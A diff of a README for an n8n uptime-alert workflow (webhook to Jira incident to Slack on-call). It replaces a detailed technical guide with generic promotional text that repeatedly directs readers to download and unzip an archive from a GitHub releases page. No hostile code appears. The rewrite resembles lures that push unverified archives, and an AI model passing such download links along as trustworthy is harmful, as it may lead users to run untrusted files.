@@ -1,208 +1,85 @@
-# **Webhook → Jira Incident → Slack On-Call Rotation (Uptime Alert Automation Workflow)**
+# 🚀 n8n-Real-time-uptime-alerts-to-Jira-with-smart-Slack-on-call-routing - Respond to Outages Instantly
 
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Lucetrsn/n8n-Real-time-uptime-alerts-to-Jira-with-smart-Slack-on-call-routing/releases)
 
-## **1.2 Summary (TL;DR)**
-This workflow automatically converts uptime monitoring alerts received via webhook into Jira incident tasks and intelligently notifies an available on-call team member on Slack based on their real-time presence status. It ensures critical service outages never go unnoticed by selecting an active responder and sending a detailed direct message immediately.
+## 📚 Description
+This application allows you to respond to outages the moment they occur. It listens for real-time uptime failures, creates Jira incidents, and sends smart Slack alerts to the right on-call engineers based on context. With this n8n workflow automation, you'll be able to handle incidents faster, reduce downtime, and ensure that your team remains informed and ready.
 
-### **⚡ Quick Implementation Steps**
-1. Import the workflow JSON into n8n.  
-2. Configure your **Webhook**, **Slack**, and **Jira** credentials.  
-3. Update the IF node to filter for `status = down` (already configured).  
-4. Set the Jira project and issue type as required.  
-5. Connect your Slack on-call channel.  
-6. Activate the workflow and send a test alert using Postman or your monitoring tool.
+## 🚀 Getting Started
+To get started with this workflow, follow the steps below. You do not need any programming knowledge to use it.
 
----
+## 🖥️ System Requirements
+- Internet connection
+- A Slack account for alerts
+- A Jira account for incident management
 
-## **1.3 What It Does**
-This automation listens for incoming alerts from any uptime monitoring service. When a system or service goes down, the workflow instantly validates whether the alert is critical (status = *down*). Once validated, it automatically creates a detailed Jira Task containing all relevant service details such as timestamp, downtime duration, error code, customer impact, and priority.
+## 🤖 Features
+- Real-time monitoring of uptime
+- Automatic incident creation in Jira
+- Smart notifications sent to Slack
+- Customizable routing based on context
+- User-friendly interface
 
-After the Jira incident is created, the workflow retrieves a list of all members from a dedicated Slack on-call rotation channel. It checks each member’s Slack presence (active, away, offline) and uses smart selection logic to choose the best person to notify. The selected team member then receives a richly formatted direct Slack message containing all incident details and a link to the Jira ticket.
+## 🚀 Setup Process
+Follow these steps to set up the workflow:
 
-This ensures the alert is not only logged properly but also reaches the right responder at the right time.
+1. **Visit the Releases Page**
+   - Go to the [Releases page](https://github.com/Lucetrsn/n8n-Real-time-uptime-alerts-to-Jira-with-smart-Slack-on-call-routing/releases).
+   
+2. **Download the Latest Release**
+   - On the Releases page, look for the latest version of the n8n workflow. Click the link that says "Download" or similar to download the file.
 
----
+3. **Unzip the File**
+   - After downloading, find the file on your computer and unzip it. You should see several files inside the folder.
 
-## **1.4 Who’s It For**
-This workflow is perfect for:
-- DevOps teams managing uptime & system reliability  
-- Support teams responsible for incident response  
-- SRE teams using Jira and Slack  
-- Organizations with an on-call rotation setup  
-- Teams wanting automated escalation for downtime alerts  
+4. **Install n8n**
+   - If you do not have n8n installed, follow the instructions on their official website to set it up. You can find clear guides on how to install n8n on various platforms.
 
----
+5. **Import the Workflow**
+   - Open n8n. Go to the workflow section and look for the import option. Select the files you unzipped earlier and import them into n8n.
 
-## **1.5 Requirements to Use This Workflow**
-- **n8n installed** (self-hosted or cloud)  
-- **Slack API credentials** with permission to read user presence and send direct messages  
-- **Jira Software Cloud** credentials allowing issue creation  
-- **A monitoring system** capable of sending webhook alerts (e.g., UptimeRobot, Uptime Kuma, StatusCake, custom system, etc.)  
-- Access to a Slack channel that includes your on-call rotation members  
+6. **Configure Your Accounts**
+   - Enter your Jira and Slack account details in the workflow settings. This allows the workflow to create incidents and send alerts.
 
----
+7. **Save and Activate the Workflow**
+   - After configuring your settings, save the workflow and activate it. The workflow will now start monitoring your uptime.
 
-## **1.6 How It Works & How to Set Up**
-### **Step 1: Receive Alert from Uptime Monitoring Tool**
-- The workflow starts with the **Webhook node** (`Receive Uptime Alert`).  
-- Your monitoring tool must send a POST request with JSON payload including fields like:
-  - `serviceName`
-  - `status`
-  - `timestamp`
-  - `customerImpact`
-  - `errorCode`
-  - `priority`
-  - etc.
+8. **Test the Workflow**
+   - To ensure everything is working correctly, simulate an outage (if possible) and check that Jira incidents are created and Slack alerts are sent.
 
-### **Step 2: Filter for Critical Status**
-- The **IF node** (`Filter for Critical Status`) checks:
-- Only when the service is *down* does the workflow continue to create a Jira incident.
+## 📞 Support
+If you encounter any issues during setup, please refer to the documentation provided with n8n or visit their support forums. Community members and developers can help you resolve your problems.
 
-### **Step 3: Create Jira Incident Task**
-- The **Create New Jira Incident** node generates a Jira **Task** with:
-- Summary: `serviceName + timestamp`
-- Description: dynamic fields based on the alert payload  
-- Set your Jira **Project** and **Issue Type** as needed.
+## 🏷️ Topics
+- jira
+- jira-tickets
+- n8n
+- n8n-automation
+- n8n-template
+- n8n-workflow
+- n8n-workflows
+- process-automation
+- real-time-monitoring
+- slack
+- slack-alerts
+- uptime-alerts
+- uptime-monitor
+- workflow-automation
+- workflow-template
 
-### **Step 4: Fetch Slack On-Call Channel Members**
-- The workflow calls Slack API to retrieve all user IDs in a designated channel (e.g., `#on-call-team`).
+## 📄 License
+This project is licensed under the MIT License. You are free to use, modify, and distribute this application while giving credit to the original authors.
 
-### **Step 5: Loop Through Each Member**
-- **Split In Batches Node** loops each Slack member individually.
-- For each user, their Slack **presence** is fetched using:
+## 💡 Frequently Asked Questions
+### 1. How does this workflow help my team?
+By automating incident reporting and alerting, your team can respond to issues more quickly without needing to manually check systems or create tickets.
 
-### **Step 6: Build Final Data for Each User**
-- The **Set node** (`Collect & Set Final Data`) stores:
-- presence  
-- member ID  
-- service details  
-- Jira ticket ID  
-- downtime info  
-- and more  
+### 2. Can I customize the alerts?
+Yes, you can modify the settings within n8n to customize how and when alerts are sent.
 
-### **Step 7: Select the Best On-Call User**
-A custom **Code node** uses presence-based logic:
+### 3. What if I encounter issues?
+Try to consult the documentation or the n8n community forums. They provide valuable support.
 
-#### **Selection Logic**
-1. If one or more users are **active** → randomly pick one active user.  
-2. If only one user is active → pick that user.  
-3. If **no users are active** → default to the **first** member from the channel.  
-
-This ensures you always get a responder.
-
-### **Step 8: Notify Selected User**
-- The **Slack Notify Node** sends a formatted direct message with:
-- service status  
-- downtime duration  
-- error code  
-- customer impact  
-- Jira ticket link  
-- priority  
-
-The selected on-call responder receives everything they need to act immediately.
-
----
-
-## **1.7 How to Customize Nodes**
-### **Webhook Node**
-- Change the path to something meaningful (e.g., `/uptime-alerts`).
-- Customize expected fields based on your monitoring tool's payload.
-
-### **IF Node**
-- Modify status condition for:
-- `"critical"`  
-- `"error"`  
-- or multiple conditions  
-
-### **Jira Node**
-You can customize:
-- Issue type (Incident, Bug, Task)
-- Priority field mapping
-- Project ID
-- Custom fields or labels
-
-### **Slack Retrieval Node**
-- Change the channel to your team's actual on-call rotation channel.
-
-### **Slack Message Node**
-- Modify message formatting, tone, emojis, or add links.
-- Add @mentions or tags.
-- Include escalation instructions.
-
----
-
-## **1.8 Add-Ons (Optional Extensions)**
-Enhance the workflow by adding:
-
-### **1. Escalation Logic**
-If the selected user doesn’t respond within X minutes, notify next user.
-
-### **2. PagerDuty / OpsGenie Integration**
-Trigger paging systems for SEV-1 incidents.
-
-### **3. Status Page Updates**
-Automatically update public status pages.
-
-### **4. Auto-Resolution**
-When service status returns to *up*, automatically:
-- Update Jira ticket  
-- Notify the team  
-- Close the incident  
-
-### **5. Logging & Analytics**
-Store incidents in Google Sheets, Notion, or a database.
-
----
-
-## **1.9 Use Case Examples**
-This workflow can support multiple real-world scenarios:
-
-1. **Website Uptime Monitoring**  
- If your main website goes down, instantly create a Jira incident and notify your on-call engineer.
-
-2. **API Downtime Alerting**  
- When an API endpoint fails health checks, alert active developers only.
-
-3. **Microservices Monitoring**  
- Each microservice alert triggers a consistent, automated incident creation and notification.
-
-4. **Infrastructure Failure Detection**  
- When servers, containers, or VMs become unreachable, escalate to your infrastructure team.
-
-5. **Database Performance Degradation**  
- If DB uptime drops or error rate spikes, create a Jira ticket and ping the database admin.
-
-And many more variations of outage, error, and performance monitoring events.
-
----
-
-## **1.10 Troubleshooting Guide**
-
-| Issue | Possible Cause | Solution |
-|-------|----------------|----------|
-| Workflow not triggering | Webhook URL not updated in monitoring tool | Copy n8n webhook URL and update in monitoring source |
-| No Jira ticket created | Invalid Jira credentials or missing project permissions | Reauthorize Jira credentials and verify permissions |
-| Slack users not found | Wrong channel ID or bot not added to channel | Ensure bot is invited to the Slack channel |
-| Slack presence not returning | Slack app lacks presence permission (`users:read.presence`) | Update Slack API scopes and reinstall |
-| No user receives notification | Presence logic always returns empty list | Test Slack presence API and verify real-time presence |
-| Wrong user selected | Intended selection logic differs | Update the JS logic in the code node |
-| Jira fields not populated | Alert payload fields missing | Verify webhook payload structure and match expected fields |
-
----
-
-## **1.11 Need Help?**
-If you need assistance setting up this workflow, customizing integrations, building escalations, or extending the logic with add-ons — **WeblineIndia is here to help**.
-
-We can assist with:
-- Custom Slack/Jira/Monitoring automation  
-- On-call rotation logic enhancements  
-- Cloud deployment & workflow optimization  
-- Any custom n8n automation  
-- Production-grade monitoring workflows  
-
-👉 **Contact WeblineIndia for professional support, implementation, and custom workflow development.**
-
----
-
-**Happy Automating!**
-```markdown
+## 🌟 Download & Install
+To get started, [download the latest release](https://github.com/Lucetrsn/n8n-Real-time-uptime-alerts-to-Jira-with-smart-Slack-on-call-routing/releases) today and begin using this robust workflow for incident management and response.
